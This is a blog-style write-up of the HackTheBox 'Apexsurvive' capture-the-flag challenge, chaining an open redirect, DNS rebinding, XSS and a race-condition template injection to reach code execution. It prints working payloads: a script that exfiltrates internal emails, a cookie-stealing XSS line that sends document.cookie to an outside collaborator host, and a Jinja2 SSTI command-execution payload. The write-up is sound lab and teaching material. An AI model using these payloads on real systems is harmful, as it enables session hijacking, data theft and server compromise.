+++
title = 'HackTheBox Cyber Apocalypse 2024 Apexsurvive Writeup'
date = 2024-03-14T17:38:37+01:00
draft = true
+++

## First Steps
We analyze the code and notice the email page will only show emails addressed to test@email.htb.

![EmailCode](/test-email.png)

We create a user with the email test@email.htb and confirm the registration by visiting the link from an email.

![Verify email 1](/verify-email-1.png)

![Verify email 2](/verify-email-2.png)

## Internal User
Upon further code inspection we find out that users that sign up with an email hosted at apexsurvive.htb will be marked as internal users.

![VerificationCode](/apexsurvive-email.png)

There's an "/external" API endpoint that can be used for an open redirect.

![Open redirect](/open-redirect.png)

And the emails are served by mailhog running on port 9000 and can be internally retrieved by using the "/api/v2/messages" endpoint.

![Mailhog port](/mailhog-port.png)

We create an user asdf@apexsurvive.htb.

![Apex register](/apex-register.png)

We log in and request a verification email. It won't appear in emails on the website.

![Apex verify](/apex-verify.png)

We'll use the /external endpoint for an open redirect to our controlled website and then do DNS rebinding to fetch emails from mailhog running on port 9000 and get the confirmation email for internal user. To do this, I'll set up an EC2 instance with a public ip address and then add a DNS NS record for it (keep in mind the dot at the end):

![DNS config](/dns-config.png)

On the instance, I'll run https://github.com/mogwailabs/DNSrebinder to change the resolution of my domain from ec2 public ip address to 127.0.0.1 after a moment:

    sudo python3 dnsrebinder.py --domain dynamic.mywebsite.xyz. --rebind 127.0.0.1 --ip <website-public-ip> --counter 1 --udp --ttl 1

We'll also run an http server on it serving index.html that keeps fetching /api/v2/messages for mailhog emails and then sends them back to us. Keep in mind it has to be on the same origin (port 9000).

    sudo python3 -m http.server 9000

index.html:

    <html>
    <body>
    <script>
        (function () {
            var axhr = new XMLHttpRequest();
            axhr.open('GET', 'http://myburpcollab.oastify.com?start=start');
            axhr.send()
            var interval = setInterval(function () {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'http://dynamic.mywebsite.xyz:9000/api/v2/messages', false);
                xhr.onload = function () {
                    if (xhr.status != 200) { return; }
                    var xhr2 = new XMLHttpRequest();
                    xhr2.open('GET', `http://myburpcollab.oastify.com?msgs=${btoa(this.responseText)}`);
                    xhr2.send();
                };
                xhr.send()
            }, 200)
        })();
    </script>
    </body>
    </html>

We log in as test@email.htb and report:

    ../external?url=http://dynamic.mywebsite.xyz:9000/

We notice how after a short moment our DNS server starts resolving our domain to 127.0.0.1 instead of our public API.

![DNS rebind](/dns-rebind.png)

It might take about 1 minute before the domain resolution is updated to 127.0.0.1. The first callback after start=start one contains base64 encoded emails from mailhog API. We decode them and get the confirmation link for the internal user.

![Exfiltrated emails](/exfiltrated-emails.png)
![Base64 emails](/base64-emails.png)

## XSS to steal admin cookie
As an internal user we now have the ability to add products. In /application/templates/product.html we notice that the product.note (Product manual) from an input controlled by us is not sanitized and allows us to escape JS backticks.

![Product note JS string escape](/product-note.png)

We add any new product and in the product manual we put in:

    `;fetch("https://myburpcollab.oastify.com/xss?c="+document.cookie);let x=`

![Add product](/add-product.png)

We double check we escaped JS backticks after adding the product:

![JS backtick escape](/js-backtick-escape.png)

After we create it, we make admin visit it by reporting its assigned product number. We take the admin session cookie from the callback.

![Admin session XSS](/admin-session-xss.png)

## Admin to RCE
As an admin, we now have the ability to add PDF contracts. We notice that:
- the file is always saved to the same location before checking it’s a pdf,
- we can save the file anywhere by using “..” in the filename,
- the pdf check takes the temporary file from the file system, not directly from the request.

![Race condition in PDF upload](/pdf-upload-race-condition.png)

As a result, there’s a race condition between saving the temp file and checking that it’s a pdf.

We prepare 2 files:
1) a small pdf,
2) a jijnja template that’ll read out the flag:

        Result {{ self.__init__.__globals__.__builtins__.__import__('os').system('/readflag > /app/application/static/images/flag.txt') }}

We upload both and add them to a burp repeater group like so:

![Burp parallel requests setup 1](/burp-parallel-1.png)
![Burp parallel requests setup 2](/burp-parallel-2.png)

We try sending them multiple times using “Send group (parallel)”. We can play around with the number of pdf/jinja2 template requests in the group. We watch out for “message: Contract added” in a response to a jinja2 template upload. We check for it by refreshing any product page multiple times. If we see our payload, the flag is available under /static/images/flag.txt.

![Result 0](/result-0.png)
![Apex flag](/apex-flag.png)

## References:
- https://unit42.paloaltonetworks.com/dns-rebinding/
- https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
- https://portswigger.net/research/smashing-the-state-machine